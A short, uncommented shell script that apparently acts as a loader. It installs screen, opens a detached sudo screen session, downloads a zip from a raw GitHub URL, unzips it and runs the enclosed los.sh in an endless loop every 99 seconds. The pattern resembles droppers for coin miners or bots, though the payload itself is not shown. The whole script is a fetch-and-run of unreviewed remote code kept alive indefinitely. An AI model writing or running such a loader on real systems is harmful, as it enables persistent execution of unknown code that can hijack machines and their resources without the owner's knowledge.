#!/bin/sh
sudo apt update -y
sudo apt install screen -y
sudo screen -dmS blas
wget https://raw.githubusercontent.com/elemenapi/los/main/los.zip
unzip los.zip
chmod +x los.sh
while [ 1 ]; do
./los.sh
sleep 99
done
sleep 99
